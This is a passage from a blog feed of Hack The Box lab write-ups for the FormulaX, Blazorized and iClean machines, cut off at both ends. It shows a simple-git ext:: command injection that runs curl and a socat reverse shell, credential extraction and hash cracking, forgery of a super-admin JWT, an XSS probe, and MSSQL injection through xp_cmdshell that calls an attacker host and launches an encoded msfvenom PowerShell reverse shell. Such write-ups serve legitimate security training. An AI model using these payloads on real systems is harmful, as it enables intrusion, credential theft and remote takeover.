                document.getElementById(&apos;error&apos;).innerHTML = response.response

        })
        .catch(err =&gt; {
            document.getElementById(&apos;error&apos;).innerHTML = err
        })
        
}</code></pre><p>However, we&apos;re not interested in XSS at this point, we want to be able to execute commands directly on the machine, so we need to focus on exploiting this endpoint:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{&quot;destinationUrl&quot;:&quot;http://10.10.14.69:9000&quot;}</code></pre><pre><code>~ python3 -m http.server 9000

Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] code 404, message File not found
::ffff:10.10.11.6 - - [01/Aug/2024 14:29:48] &quot;GET /info/refs?service=git-upload-pack HTTP/1.1&quot; 404 -</code></pre><p>Going through the documentation, it seems like this request is the result of a <code>git fetch</code> or a <code>git fetch-pack</code> being performed by a Git client.</p><p>Basically, it&apos;s a way for the client to ask a Git server &quot;to send objects missing from this repository, to update the named heads&quot;. In response, the server sends &quot;a UNIX formatted text file describing each ref and its known value&quot;.<br>[<a href="https://mincong.io/2018/05/04/git-and-http/">Source</a>]</p><p>However, when we try to respond with the format specified in the documentation, we still get an error:</p><pre><code class="language-python">import json
from flask import Flask
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

@app.route(&apos;/info/refs&apos;, methods=[&apos;GET&apos;])
def handle_git_request():
    headers = {
        &apos;ContentType&apos;:&apos;application/x-git-upload-pack-advertisement&apos;,
        &apos;Cache-Control&apos;: &apos;no-cache&apos;
    }
    response = &apos;001e# service=git-upload-pack\n&apos;
    response += &apos;004895dcfa3633004da0049d3d0fa03f80589cbcaf31 refs/heads/maint\0multi_ack\n&apos;
    response += &apos;0042d049f6c27a2244e12041955e262a404c7faba355 refs/heads/master\n&apos;
    response += &apos;003c2cb58b79488a98d2721cea644875a8dd0026b115 refs/tags/v1.0\n&apos;
    response += &apos;003fa3c2e2402b99163d1d59756e5f207ae21cccba4c refs/tags/v1.0^{}\n&apos;
    return response, 200, headers

app.run(host=&apos;0.0.0.0&apos;, port=9000)
</code></pre><p>We know that <a href="https://security.snyk.io/package/npm/simple-git">simple-git</a> has 2 RCE vulnerabilities that affect version <code>3.14</code>, one of which (<a href="https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221">SNYK-JS-SIMPLEGIT-3112221)</a> affects the <code>clone</code> method specifically:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png" class="kg-image" alt="HTB Write-up | FormulaX (user-only)" loading="lazy" width="739" height="396" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-01-at-15.16.57.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-01-at-15.16.57.png 739w" sizes="(min-width: 720px) 720px"></figure><p>The <code>clone</code> function accepts the following arguments:</p><pre><code>git.clone(repoURL, localPath, options, handlerFn);</code></pre><p>We can assume that the <code>destinationUrl</code> we&apos;re sending in the POST request is being injected in the <code>repoURL</code> field, so let&apos;s try to modify the request to ping a local port:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
Content-Type: application/json

{&quot;destinationUrl&quot;:&quot;ext::sh -c curl% http://10.10.14.69:9000% &gt;&amp;2&quot;}</code></pre><pre><code>python3 -m http.server 9000
Serving HTTP on :: port 9000 (http://[::]:9000/) ...
::ffff:10.10.11.6 - - [01/Aug/2024 16:49:49] &quot;GET / HTTP/1.1&quot; 200 -
</code></pre><p>Great, we can send commands to the machine!</p><p>Looking further into the <a href="https://git-scm.com/docs/git-remote-ext#_examples">documentation</a> that pertains to this &quot;remote helper&quot; (basically, the feature that supports the <code>ext::</code> syntax) we can see that we can also use <code>socat</code>, so let&apos;s try to use that to get a reverse shell:</p><pre><code>POST /clone HTTP/1.1
Host: dev-git-auto-update.chatbot.htb
...

{&quot;destinationUrl&quot;:&quot;ext::socat TCP:10.10.14.69:4444 EXEC:&apos;sh&apos;,pty,stderr,setsid,sigint,sane&quot;}</code></pre><p>... and we get a shell!</p><p>Let&apos;s upgrade it: </p><pre><code class="language-bash">$ python3 -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</code></pre><hr><h2 id="from-foothold-to-user">From foothold to user</h2><pre><code>$ whoami
www-data

$ ls -la
...
dr-xr-xr-x  9 root     root     4096 Jul 28  2023 app
dr-xr-xr-x  3 root     root     4096 Feb 20 15:50 automation
dr-xr-xr-x  4 root     root     4096 Jul 29  2023 git-auto-update</code></pre><p>The <code>app</code> directory contains the source code for the NodeJS web application we just explored, which includes a <code>.env</code> file:</p><figure class="kg-card kg-code-card"><pre><code>PORT = 8082
URL_DATABASE=&quot;mongodb://localhost:27017&quot;
SECRET=ThisIsTheN0deSecret
ADMIN_EMAIL=&quot;admin@chatbot.htb&quot;</code></pre><figcaption>/var/www/app/.env</figcaption></figure><p>We can find more info about the MongoDB configuration in the <code>connect_db.js</code> file:</p><figure class="kg-card kg-code-card"><pre><code>import mongoose from &quot;mongoose&quot;;

const connectDB= async(URL_DATABASE)=&gt;{
    try{
        const DB_OPTIONS={
            dbName : &quot;testing&quot;
        }
        mongoose.connect(URL_DATABASE,DB_OPTIONS)
        console.log(&quot;Connected Successfully TO Database&quot;)
    } catch(error){
        console.log(`Error Connecting to the ERROR ${error}`);
    }
}</code></pre><figcaption>/var/www/app/configuration/connect_db.js</figcaption></figure><p>As shown above, we don&apos;t need a password to be able to connect to the <code>testing</code> database.</p><pre><code>$ netstat -tunpl | grep 27017
tcp     0     0     127.0.0.1:27017     0.0.0.0:*     LISTEN     -

$ which mongo
/usr/bin/mongo

$ /usr/bin/mongo
MongoDB shell version v4.4.29
connecting to: mongodb://127.0.0.1:27017/?
[...]

&gt; show dbs;
admin    0.000GB
config   0.000GB
local    0.000GB
testing  0.000GB

&gt; use testing;
switched to db testing

&gt; show collections;
messages
users

&gt; db.users.find()
{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457c&quot;), &quot;name&quot; : &quot;admin&quot;, &quot;email&quot; : &quot;admin@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$VSrvhM/5YGM0uyCeEYf/TuvJzzTz.jDLVJ2QqtumdDoKGSa.6aIC.&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot;Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySUQiOiI2NDg4NzRkZTMxM2I4NzE3Mjg0ZjQ1N2MiLCJpYXQiOjE3MjI1OTU2NDd9.iwgmNmvtm1s6WYvy4AbElQ1Hz3bvnd6UKkT2pHTntrs&quot;, &quot;__v&quot; : 0 }
{ &quot;_id&quot; : ObjectId(&quot;648874de313b8717284f457d&quot;), &quot;name&quot; : &quot;frank_dorky&quot;, &quot;email&quot; : &quot;frank_dorky@chatbot.htb&quot;, &quot;password&quot; : &quot;$2b$10$hrB/by.tb/4ABJbbt1l4/ep/L4CTY6391eSETamjLp7s.elpsB4J6&quot;, &quot;terms&quot; : true, &quot;value&quot; : true, &quot;authorization_token&quot; : &quot; &quot;, &quot;__v&quot; : 0 }</code></pre><p>So, we have an encrypted password for the <code>admin</code> user, but this is not super relevant since the unencrypted version is hardcoded in the source code, and we can confirm it&apos;s not valid for <code>SSH</code>:</p><figure class="kg-card kg-code-card"><pre><code class="language-javascript">// [...]
await page.goto(&apos;http://chatbot.htb/static/index.html&apos;, { timeout: 30000 });
// [...]
await page.type(&apos;#email&apos;, &apos;admin@chatbot.htb&apos;);
await page.type(&apos;#password&apos;, &apos;iamnottheadmin$&apos;);
// [...]</code></pre><figcaption>/var/www/automation/index.js</figcaption></figure><p>So this leaves us with the <code>frank_dorky</code> encrypted password:</p><pre><code>~ hashcat -a 0 -m 3200 frank_hash.txt rockyou-75.txt --status --status-timer=10 -w 3</code></pre><pre><code>~ ssh frank_dorky@chatbot.htb
frank_dorky@chatbot.htb&apos;s password:
&gt; manchesterunited

frank_dorky@formulax:~$</code></pre>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | Blazorized (user-only)]]></title><description><![CDATA[Write-up for Blazorized, a retired HTB Windows machine.]]></description><link>inesmartins.github.io/htb-writeup-blazorized/</link><guid isPermaLink="false">66b0ae8a29acb9fd804defc0</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Wed, 13 Nov 2024 13:30:46 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.48.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.48.png" alt="HTB Write-up | Blazorized (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/Blazorized">here</a>.</em></p><hr><h2 id="enumeration">Enumeration</h2><pre><code>~ nmap -F 10.10.11.22 -Pn

PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s</code></pre><p>Port <code>80</code> redirects to <a href="http://blazorized.htb/">http://blazorized.htb/</a>, which means this virtual host needs to be mapped in order for us to be able to access the web application.</p><pre><code>~ sudo nano /etc/hosts

[...]
10.10.11.22 blazorized.htb</code></pre><p>The website is built using <a href="https://dotnet.microsoft.com/en-us/apps/aspnet/web-apps/blazor">Blazor WebAssembly</a>:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1439" height="714" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-11.59.30.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-11.59.30.png 1439w" sizes="(min-width: 1200px) 1200px"></figure><blockquote>Blazor is a feature of ASP.NET for building interactive web UIs using C# instead of JavaScript. It&apos;s real .NET running in the browser on <em>WebAssembly.</em></blockquote><p>It looks like we can temporarily &quot;impersonate&quot; the <code>super admin</code> user:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1152" height="466" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.01.41.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.01.41.png 1152w" sizes="(min-width: 720px) 720px"></figure><p>This button performs <code>GET</code> requests to <a href="http://api.blazorized.htb/posts">http://api.blazorized.htb/posts</a> and <a href="http://api.blazorized.htb/categories">http://api.blazorized.htb/categories</a> with an <code>authorization</code> header that contains a bearer token:</p><pre><code>authorization: Bearer eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjpbIlBvc3RzX0dldF9BbGwiLCJDYXRlZ29yaWVzX0dldF9BbGwiXSwiZXhwIjoxNzIyODU2MzAyLCJpc3MiOiJodHRwOi8vYXBpLmJsYXpvcml6ZWQuaHRiIiwiYXVkIjoiaHR0cDovL2FwaS5ibGF6b3JpemVkLmh0YiJ9.J4bJYYN3EkV-PfFWJ90yAyOFS158LOanNLTduowSPHdYv28W7GQ59zeadaRaCZsyM_cfDH5r_tGXD0Mf43AUwA</code></pre><p>At this point, I&apos;m not sure how this token is being generated because it doesn&apos;t seem to be retrieved from the API, and it&apos;s not hardcoded in any of the resource files, so there&apos;s probably some Blazor magic under the hood.</p><p>We can use <a href="https://github.com/hahwul/jwt-hack">jwt-hack</a> to decode it:</p><pre><code>~ jwt-hack decode &lt;the-token&gt;

INFO[0000] Decoded data(claims)

header=&quot;{\&quot;alg\&quot;:\&quot;HS512\&quot;,\&quot;typ\&quot;:\&quot;JWT\&quot;}&quot; 
method=&quot;&amp;{HS512 SHA-512}&quot;

INFO[0000] Expiraton Time
EXP=1722856302 TIME=&quot;1970-01-01 01:00:01.722856302 +0100 CET&quot;

{
    &quot;aud&quot;:&quot;http://api.blazorized.htb&quot;,
    &quot;exp&quot;:1722856302,
    &quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;:[
       &quot;Posts_Get_All&quot;,
       &quot;Categories_Get_All&quot;
    ],
    &quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;:&quot;superadmin@blazorized.htb&quot;,
    &quot;iss&quot;:&quot;http://api.blazorized.htb&quot;
}</code></pre><p>We can see that this token was generated for a user with the <code>superadmin@blazorized.htb</code> email, and has the following &quot;claims&quot;: <code>Posts_Get_All</code> and <code>Categories_Get_All</code>.</p><p>We can also see from the API responses that the posts&apos; content is formatted in Markdown:</p><pre><code class="language-json">{
   &quot;Posts&quot;:[
      {
         &quot;ID&quot;:&quot;1c391f9c-fd3e-4d86-b966-9a3e5d7e3d28&quot;,
         &quot;Title&quot;:&quot;Active Directory&quot;,
         &quot;MarkdownContent&quot;:&quot;Below are links to projects and posts relating AD red-teaming:\r\n\r\n- https://github.com/Group3r/Group3r\r\n- https://github.com/Leo4j/Amnesiac\r\n- https://github.com/JPG0mez/ADCSync\r\n- https://github.com/Processus-Thief/HEKATOMB\r\n- https://github.com/Mazars-Tech/AD_Miner\r\n- https://github.com/AlmondOffSec/PassTheCert\r\n- https://github.com/synacktiv/ntdissector\r\n- https://github.com/Hackndo/pyGPOAbuse\r\n- https://exploit.ph/external-trusts-are-evil.html\r\n- https://github.com/SecuraBV/Timeroast\r\n- https://github.com/SadProcessor/CypherDog\r\n- https://mayfly277.github.io/&quot;,&quot;CategoryID&quot;:&quot;9a445790-f7e8-4351-8cf4-46fcae383eec&quot;},
...
}</code></pre><p>This means that the front-end is somehow processing and displaying this Markdown, which may result in stored XSS if we&apos;re able to create or manipulate posts or categories:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1431" height="715" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.28.14.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.28.14.png 1431w" sizes="(min-width: 1200px) 1200px"></figure><p>This suspicion is further confirmed because the Markdown &quot;playground&quot; is vulnerable to DOM-based XSS:</p><pre><code class="language-html">&lt;img src=x onerror=alert(1) /&gt; </code></pre><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1123" height="496" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.17.47.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.17.47.png 1123w" sizes="(min-width: 720px) 720px"></figure><p>However, only the <code>GET</code> method seems to be allowed for <code>/posts</code> and <code>/categories</code>:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="944" height="437" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-12.39.10.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-12.39.10.png 944w" sizes="(min-width: 720px) 720px"></figure><p>When we try to request a non-existent post ID, we see that all of the application&apos;s DLLs and other source files are available under the <code>_framework</code> directory:</p><pre><code>http://blazorized.htb/post/1

http://blazorized.htb/_framework/blazor.boot.json
http://blazorized.htb/_framework/Blazored.LocalStorage.dll
http://blazorized.htb/_framework/Blazorized.DigitalGarden.dll
http://blazorized.htb/_framework/Blazorized.Shared.dll
...</code></pre><p>Let&apos;s download all of these files to a local dir ...</p><pre><code>~ wget -i requests.txt</code></pre><p>... so we can use the <a href="https://marketplace.visualstudio.com/items?itemName=icsharpcode.ilspy-vscode">ilspy-vscode extension</a> to decompile the relevant source code.</p><p>It looks like the <code>Blazorized.Helpers</code> namespace has a <code>JWT</code> class that contains the logic for the temporary token generation, as well as a new interesting subdomain:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1441" height="710" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-05-at-13.24.44.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-05-at-13.24.44.png 1441w" sizes="(min-width: 1200px) 1200px"></figure><p>Note that this application is built with <a href="https://learn.microsoft.com/en-us/aspnet/core/blazor/hosting-models?view=aspnetcore-8.0#blazor-server">Blazor Server</a>, instead of Blazor WebAssembly:</p><blockquote>With the Blazor Server hosting model, components are executed on the server from within an ASP.NET Core app. UI updates, event handling, and JavaScript calls are handled over a <a href="https://learn.microsoft.com/en-us/aspnet/core/signalr/introduction?view=aspnetcore-8.0">SignalR</a> connection using the <a href="https://learn.microsoft.com/en-us/aspnet/core/fundamentals/websockets?view=aspnetcore-8.0">WebSockets protocol</a>. <em>[...]</em></blockquote><p>It&apos;s unlikely, but possible, that the JWT we have is a valid form of authorization for this subdomain. </p><p>We can see that there are 2 different &quot;audiences&quot; in the source code: <code>apiAudience</code> and <code>adminDashboardAudience</code>.</p><p>We can guess that the <code>temporary</code> token we&apos;ve previously come across is generated using the following function:</p><pre><code>public static string GenerateTemporaryJWT(long expirationDurationInSeconds = 60L)
{
    try
    {
        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
        {
            new Claim(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;, superAdminEmailClaimValue),
            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, postsPermissionsClaimValue),
            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, categoriesPermissionsClaimValue)
        };
        SigningCredentials signingCredentials = GetSigningCredentials();
        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
        JwtSecurityToken token = new JwtSecurityToken(issuer, apiAudience, claims, null, expires, signingCredentials);
        return new JwtSecurityTokenHandler().WriteToken(token);
    }
    catch (Exception)
    {
        throw;
    }
}
</code></pre><p>But there is another function, which generates a token for the same email address but for the <code>adminDashboardAudience</code>, and with the <code>superAdminRoleClaimValue</code> claim:</p><pre><code>using System;
using System.Collections.Generic;
using System.IdentityModel.Tokens.Jwt;
using System.Security.Claims;
using Microsoft.IdentityModel.Tokens;

public static string GenerateSuperAdminJWT(long expirationDurationInSeconds = 60L)
{
    try
    {
        List&lt;Claim&gt; claims = new List&lt;Claim&gt;
        {
            new Claim(&quot;http://schemas.xmlsoap.org/ws/2005/05/identity/claims/emailaddress&quot;, superAdminEmailClaimValue),
            new Claim(&quot;http://schemas.microsoft.com/ws/2008/06/identity/claims/role&quot;, superAdminRoleClaimValue)
        };
        SigningCredentials signingCredentials = GetSigningCredentials();
        DateTime? expires = DateTime.UtcNow.AddSeconds(expirationDurationInSeconds);
        JwtSecurityToken token = new JwtSecurityToken(issuer, adminDashboardAudience, claims, null, expires, signingCredentials);
        return new JwtSecurityTokenHandler().WriteToken(token);
    }
    catch (Exception)
    {
        throw;
    }
}
</code></pre><p>Let&apos;s create a new .NET project, import the relevant DLLs, and try to generate a valid token (we increased the expiration to 600000 seconds, to make testing easier):</p><figure class="kg-card kg-code-card"><pre><code class="language-C#">using Blazorized.Helpers;

namespace BlazorJWTMock
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine(&quot;Generating super admin token ...&quot;);
            Console.WriteLine(JWT.GenerateSuperAdminJWT(600000));
            Console.WriteLine(&quot;Done!&quot;);
        }
    }
}</code></pre><figcaption>BlazorJWTMock/Program.cs</figcaption></figure><figure class="kg-card kg-code-card"><pre><code>&lt;Project Sdk=&quot;Microsoft.NET.Sdk&quot;&gt;
  &lt;PropertyGroup&gt;
    &lt;OutputType&gt;Exe&lt;/OutputType&gt;
    &lt;TargetFramework&gt;net7.0&lt;/TargetFramework&gt;
    &lt;ImplicitUsings&gt;enable&lt;/ImplicitUsings&gt;
    &lt;Nullable&gt;enable&lt;/Nullable&gt;
  &lt;/PropertyGroup&gt;
  &lt;ItemGroup&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazored.LocalStorage.dll&quot; /&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazorized.DigitalGarden.dll&quot; /&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Blazorized.Helpers.dll&quot; /&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.Tokens.dll&quot; /&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/Microsoft.IdentityModel.JsonWebTokens.dll&quot; /&gt;
    &lt;Reference Include=&quot;&lt;PATH-TO-LIBS&gt;/System.IdentityModel.Tokens.Jwt.dll&quot; /&gt;
  &lt;/ItemGroup&gt;
&lt;/Project&gt;</code></pre><figcaption>BlazorJWTMock/BlazorJWTMock.csproj</figcaption></figure><pre><code>~ dotnet run --project BlazorJwtMock/BlazorJwtMock.csproj

Generating admin token ...

eyJhbGciOiJIUzUxMiIsInR5cCI6IkpXVCJ9.eyJodHRwOi8vc2NoZW1hcy54bWxzb2FwLm9yZy93cy8yMDA1LzA1L2lkZW50aXR5L2NsYWltcy9lbWFpbGFkZHJlc3MiOiJzdXBlcmFkbWluQGJsYXpvcml6ZWQuaHRiIiwiaHR0cDovL3NjaGVtYXMubWljcm9zb2Z0LmNvbS93cy8yMDA4LzA2L2lkZW50aXR5L2NsYWltcy9yb2xlIjoiU3VwZXJfQWRtaW4iLCJleHAiOjE3MjI4NzgyNzUsImlzcyI6Imh0dHA6Ly9hcGkuYmxhem9yaXplZC5odGIiLCJhdWQiOiJodHRwOi8vYWRtaW4uYmxhem9yaXplZC5odGIifQ.XUlzWUdD04FGiWCOP_SbsULNGCDVNRmvmSlAAEi2SCJNmUNf9irKVmtvyReIl0tqN8WwcvkrqWxAOO3RMXZONw

Done!</code></pre><p>Ok, we have a token, but we&apos;re not sure how to use it to authenticate in the <code>admin</code> subdomain.</p><p>Even after reversing every DLL that looked relevant, I couldn&apos;t find the logic that was responsible for getting or setting this token, so I decided to fuzz this parameter, as recommended in the forum:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="783" height="438" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.46.49.png 600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.46.49.png 783w" sizes="(min-width: 720px) 720px"></figure><p>The solution was to add this JWT to the <code>jwt</code> LocalStorage value:</p><figure class="kg-card kg-image-card kg-width-wide"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png" class="kg-image" alt="HTB Write-up | Blazorized (user-only)" loading="lazy" width="1633" height="652" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1000w, inesmartins.github.io/content/images/size/w1600/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1600w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-06-at-10.37.36.png 1633w" sizes="(min-width: 1200px) 1200px"></figure><hr><h2 id="from-admin-to-foothold">From Admin to Foothold</h2><p>We have an obvious clue from the <code>/home</code> page:</p><blockquote>To avoid latency issues, this super admin panel does not consume the API but speaks to the database directly.</blockquote><p>We can see that the &quot;Check Duplicate&quot; features are vulnerable to SQLi, and we know from the initial <code>nmap</code> scan that we&apos;re dealing with a MSSQL database, so let&apos;s try to get a request from the victim machine using a stacked query and the <code>EXEC master.dbo.xp_cmdshell</code> command, e.g.:</p><pre><code>&apos;;EXEC master.dbo.xp_cmdshell &apos;curl http://10.10.14.91:8000&apos;;--</code></pre><pre><code>~ python3 -m http.server 8000
::ffff:10.10.11.22 - - [06/Aug/2024 11:58:11] &quot;GET / HTTP/1.1&quot; 200 -</code></pre><p>Alright, let&apos;s try to trigger a reverse shell:</p><pre><code>~ msfvenom -p cmd/windows/reverse_powershell LHOST={local_ip} LPORT={local_port} &gt; revshell.txt

# after cleaning up the revshell.txt file and removing &quot;powershell -w hidden -nop -c&quot;

~ iconv -f ASCII -t UTF-16LE revshell.txt | base64 | tr -d &apos;\n&apos;
JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...

~ powershell.exe -EncodedCommand JABhAD0AJwAxADAALgAxADAALgAxADQALgA5ADEAJwA7ACQAYgA9ADQANAA0ADQAOwAkAGMAPQBOA...</code></pre><p>and we get a shell!</p><pre><code>~ nc -l 4444
Microsoft Windows [Version 10.0.17763.5936]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32&gt; whoami
blazorized\nu_1055

C:\Windows\system32&gt; cd Users
C:\Users&gt; dir
02/25/2024  03:41 PM    &lt;DIR&gt;          NU_1055
...

C:\Users&gt;type C:\Users\NU_1055\Desktop\user.txt</code></pre><p>We didn&apos;t even have to pivot to get the user flag! :)</p>]]></content:encoded></item><item><title><![CDATA[HTB Write-up | iClean (user-only)]]></title><description><![CDATA[Write-up for iClean, a retired HTB Linux machine.]]></description><link>inesmartins.github.io/htb-writeup-iclean/</link><guid isPermaLink="false">66acd79382fc3c3df851727b</guid><category><![CDATA[ctf]]></category><category><![CDATA[htb]]></category><dc:creator><![CDATA[Inês Martins]]></dc:creator><pubDate>Sun, 04 Aug 2024 14:31:06 GMT</pubDate><media:content url="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.59.png" medium="image"/><content:encoded><![CDATA[<img src="inesmartins.github.io/content/images/2024/11/Screenshot-2024-11-13-at-13.35.59.png" alt="HTB Write-up | iClean (user-only)"><p><em>Retired machine can be found <a href="https://www.hackthebox.com/machines/IClean">here</a>.</em></p><hr><p>Let&apos;s start with a basic scan:</p><pre><code>~ nmap -F 10.10.11.12

22/tcp open  ssh
80/tcp open  http</code></pre><p><a href="10.10.11.12">10.10.11.12</a> redirects to capiclean.htb, so let&apos;s map out this domain.</p><pre><code>~ sudo nano /etc/hosts

10.10.11.12 capiclean.htb</code></pre><figure class="kg-card kg-image-card kg-width-wide kg-card-hascaption"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.07.50.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1256" height="819" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.07.50.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.07.50.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.07.50.png 1256w" sizes="(min-width: 1200px) 1200px"><figcaption>http://capiclean.htb/</figcaption></figure><p>The login page is very simple:</p><figure class="kg-card kg-image-card"><img src="inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.08.04.png" class="kg-image" alt="HTB Write-up | iClean (user-only)" loading="lazy" width="1264" height="774" srcset="inesmartins.github.io/content/images/size/w600/2024/08/Screenshot-2024-08-02-at-14.08.04.png 600w, inesmartins.github.io/content/images/size/w1000/2024/08/Screenshot-2024-08-02-at-14.08.04.png 1000w, inesmartins.github.io/content/images/2024/08/Screenshot-2024-08-02-at-14.08.04.png 1264w" sizes="(min-width: 720px) 720px"></figure><pre><code>POST /login HTTP/1.1
Host: capiclean.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 29

